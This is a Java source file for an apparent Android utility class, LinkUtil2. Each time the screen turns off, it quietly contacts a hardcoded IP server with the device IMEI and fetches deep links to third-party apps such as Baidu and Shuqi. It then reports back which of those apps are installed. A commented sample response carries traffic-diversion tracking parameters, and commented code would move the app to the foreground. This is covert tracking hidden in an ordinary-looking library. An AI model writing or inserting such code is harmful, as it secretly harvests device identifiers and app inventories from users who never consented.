package com.pingan.baselibs.utils;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.util.Log;
import com.elvishew.xlog.XLog;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import static android.content.Context.ACTIVITY_SERVICE;

public class LinkUtil2 {

	private ScreenActionReceiver screenActionReceiver;
	private int hitcount = 0;

	private static LinkUtil2 instance;

	public static LinkUtil2 getInstance() {
		if (instance == null) {
			instance = new LinkUtil2();
		}
		return instance;
	}

	private LinkUtil2() {
		screenActionReceiver = new ScreenActionReceiver();
	}

	public void registerReceiver(Context context) {
		screenActionReceiver.registerScreenActionReceiver(context);
	}

	public void unregisterReceiver(Context context) {
		screenActionReceiver.unRegisterScreenActionReceiver(context);
	}

	public int getHitCount() {
		return hitcount;
	}

	public void clearHitCount() {
		hitcount = 0;
	}

	private final String BASE_URL = "http://120.76.74.62:8081/sdkserver/";

	private String getImei(Context context) {
		try {
			return DeviceUtils.getDeviceId(context);
			//return ((TelephonyManager) context.getSystemService(
			//	Context.TELEPHONY_SERVICE)).getDeviceId();
		} catch (Exception e) {
			return UUID.randomUUID().toString();
		}
	}

	private String get(String url) {
		HttpURLConnection con = null;
		try {
			URL u = new URL(url);
			con = (HttpURLConnection) u.openConnection();
			con.setRequestMethod("GET");
			con.setConnectTimeout(60000);
			con.setReadTimeout(60000);
			con.setDoOutput(true);
			con.setDoInput(true);
			con.setUseCaches(false);
			con.setRequestProperty("Content-Type", "text/html");
			con.connect();

			StringBuffer buffer = new StringBuffer();
			BufferedReader br =
				new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"));
			String temp;
			while ((temp = br.readLine()) != null) {
				buffer.append(temp);
			}
			br.close();
			return buffer.toString();
		} catch (Exception e) {
		} finally {
			if (con != null) {
				con.disconnect();
			}
		}
		return null;
	}

	public void getLinks(final Context context) {
		new Thread(new Runnable() {
			@Override public void run() {
				String url = BASE_URL
					+ "linkres?op=getlink&appkey=689c968587ea42d3984f07a110593a39&imei="
					+ getImei(context);
				String res = get(url);
				if (res == null) {
					return;
				}
				//res =
				//	"{\"links\":[{\"reskey\":\"wangyixinwen20190111\",\"resvalue\":\"newsapp://startup/doc/E4TNOTD7000187VE?s=aiqi&spsug=ug&spsugdate=0&spsugextend=aiqi30\"},{\"reskey\":\"baidu20190111a\",\"resvalue\":\"baiduboxapp://utils?action=sendIntent&minver=7.4&params=%7B%22intent%22%3A%22intent%3A%23Intent%3Baction%3Dcom.baidu.searchbox.action.HOME%3BS.targetCommand%3D%257B%2522mode%2522%253A%25220%2522%252C%2522intent%2522%253A%2522intent%253A%2523Intent%253BB.bdsb_append_param%253Dtrue%253BS.bdsb_light_start_url%253Dhttp%25253A%25252F%25252Fbaijiahao.baidu.com%25252Fs%25253Fid%25253D1621465120569793156%253Bend%2522%252C%2522class%2522%253A%2522com.baidu.searchbox.xsearch.UserSubscribeCenterActivity%2522%252C%2522min_v%2522%253A%252216787968%2522%257D%3Bend%22%7D&needlog=1&logargs=%7B%22source%22%3A%221020864i%22%2C%22from%22%3A%22openbox%22%2C%22page%22%3A%22other%22%2C%22type%22%3A%22%22%2C%22value%22%3A%22url%22%2C%22channel%22%3A%22%22%2C%22ext%22%3A%22%7B%5C%22sid%5C%22%3A%5C%22%7Bqueryid%7D%5C%22%7D%22%7D\"},{\"reskey\":\"koubei20190111\",\"resvalue\":\"koubei://platformapi/startapp?appId=20000001&actionType=20000238&chInfo=ch_DAUyinliu__chsub_jiguang40\"},{\"reskey\":\"shuqixiaoshuo20190111\",\"resvalue\":\"shuqi://openapp?params=%7B%22from%22%3A%22free20190102jiguang2%22%2C%22pageName%22%3A%22browser%22%2C%22params%22%3A%7B%22pageTitle%22%3A%22%E4%B9%A6%E6%97%97%E5%B0%8F%E8%AF%B4%22%2C%22targetUrl%22%3A%22http%3A%2F%2Fbookstore.shuqiread.com%2Froute.php%3Fsq_pg_param%3Dbsst%23!%2Fpage_id%2F138%2F%22%7D%7D\"},{\"reskey\":\"baidu20190111i\",\"resvalue\":\"baiduboxapp://utils?action=sendIntent&minver=7.4&params=%7B%22intent%22%3A%22intent%3A%23Intent%3Baction%3Dcom.baidu.searchbox.action.HOME%3BS.targetCommand%3D%257B%2522mode%2522%253A%25220%2522%252C%2522intent%2522%253A%2522intent%253A%2523Intent%253BB.bdsb_append_param%253Dtrue%253BS.bdsb_light_start_url%253Dhttp%25253A%25252F%25252Fbaijiahao.baidu.com%25252Fs%25253Fid%25253D1621532223803106737%253Bend%2522%252C%2522class%2522%253A%2522com.baidu.searchbox.xsearch.UserSubscribeCenterActivity%2522%252C%2522min_v%2522%253A%252216787968%2522%257D%3Bend%22%7D&needlog=1&logargs=%7B%22source%22%3A%221020864i%22%2C%22from%22%3A%22openbox%22%2C%22page%22%3A%22other%22%2C%22type%22%3A%22%22%2C%22value%22%3A%22url%22%2C%22channel%22%3A%22%22%2C%22ext%22%3A%22%7B%5C%22sid%5C%22%3A%5C%22%7Bqueryid%7D%5C%22%7D%22%7D\"}],\"result\":\"0\",\"resultMsg\":\"ok\"}\n"
				//		+ "   ";
				//XLog.d(res);
				Log.i("dd", res);
				try {
					JSONObject resObject = new JSONObject(res);
					JSONArray links = resObject.getJSONArray("links");
					if (links == null) return;
					hitcount = 0;
					for (int i = 0; i < links.length(); i++) {
						JSONObject link = links.getJSONObject(i);
						final String deeplinkkey = link.getString("reskey");
						final String deeplinkvalue = link.getString("resvalue");

						try {
							subEvent(context, deeplinkkey, "execlink");

							Intent intent =
								new Intent(Intent.ACTION_VIEW, Uri.parse(deeplinkvalue));
							boolean isInstalled =
								intent.resolveActivity(context.getPackageManager()) != null;
							if (isInstalled) {
								subEvent(context, deeplinkkey, "succlink");
								Log.e("dd", "succlink " + deeplinkkey);
							} else {
								subEvent(context, deeplinkkey, "faillink");
								Log.e("dd", "faillink " + deeplinkkey);
							}
							hitcount++;
						} catch (Exception e) {
							//e.printStackTrace();
							subEvent(context, deeplinkkey, "faillink");
						}
					}
					if (hitcount > 0) {
						//Intent i = new Intent(Intent.ACTION_MAIN);
						//i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						//i.addCategory(Intent.CATEGORY_HOME);
						//context.startActivity(i);
						//Thread.currentThread().sleep(3000);
						//setTopApp(context);
					}
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					//e.printStackTrace();
					Log.i("dd", "后台没有返回数据");
				}
			}
		}).start();
	}

	private void subEvent(Context context, String key, String value) {
		String urlReq = BASE_URL
			+ "linkevent?op=subevent&appkey=689c968587ea42d3984f07a110593a39&imei="
			+ getImei(context)
			+ "&eventkey="
			+ key
			+ "&eventvalue="
			+ value;
		get(urlReq);
	}

	public class ScreenActionReceiver extends BroadcastReceiver {

		private boolean isRegisterReceiver = false;

		@Override public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			try {
				if (action.equals(Intent.ACTION_SCREEN_ON)) {
					if (LinkUtil2.getInstance().getHitCount() > 0) {
						//Intent i = new Intent(Intent.ACTION_MAIN);
						//i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						//i.addCategory(Intent.CATEGORY_HOME);
						//context.startActivity(i);
						//setTopApp(context);
						LinkUtil2.getInstance().clearHitCount();
					}
				} else if (action.equals(Intent.ACTION_SCREEN_OFF)) {
					LinkUtil2.getInstance().getLinks(context);
				}
			} catch (Exception e) {

			}
		}

		public void registerScreenActionReceiver(Context mContext) {
			if (!isRegisterReceiver) {
				isRegisterReceiver = true;
				IntentFilter filter = new IntentFilter();
				filter.addAction(Intent.ACTION_SCREEN_OFF);
				filter.addAction(Intent.ACTION_SCREEN_ON);
				mContext.registerReceiver(ScreenActionReceiver.this, filter);
			}
		}

		public void unRegisterScreenActionReceiver(Context mContext) {
			if (isRegisterReceiver) {
				isRegisterReceiver = false;
				mContext.unregisterReceiver(ScreenActionReceiver.this);
			}
		}
	}

	public static void setTopApp(Context context) {
		if (!isRunningForeground(context)) {
			/**获取ActivityManager*/
			ActivityManager activityManager =
				(ActivityManager) context.getSystemService(ACTIVITY_SERVICE);

			/**获得当前运行的task(任务)*/
			List<ActivityManager.RunningTaskInfo> taskInfoList =
				activityManager.getRunningTasks(100);
			for (ActivityManager.RunningTaskInfo taskInfo : taskInfoList) {
				/**找到本应用的 task，并将它切换到前台*/
				Log.e("dd", "pkg name: " + taskInfo.topActivity.getPackageName());
				if (taskInfo.topActivity.getPackageName().equals(context.getPackageName())) {
					activityManager.moveTaskToFront(taskInfo.id, 0);
					Log.e("dd", "start 3");
					break;
				}
			}
		}
	}

	/**
	 * 判断本应用是否已经位于最前端
	 *
	 * @return 本应用已经位于最前端时，返回 true；否则返回 false
	 */
	public static boolean isRunningForeground(Context context) {
		ActivityManager activityManager =
			(ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
		List<ActivityManager.RunningAppProcessInfo> appProcessInfoList =
			activityManager.getRunningAppProcesses();
		/**枚举进程*/
		for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfoList) {
			if (appProcessInfo.importance
				== ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
				if (appProcessInfo.processName.equals(context.getApplicationInfo().processName)) {
					return true;
				}
			}
		}
		return false;
	}

	private boolean isAppInstalled(Context context, String uri) {
		PackageManager pm = context.getPackageManager();
		boolean installed = false;
		try {
			pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
			installed = true;
		} catch (PackageManager.NameNotFoundException e) {
			installed = false;
		}
		return installed;
	}
}
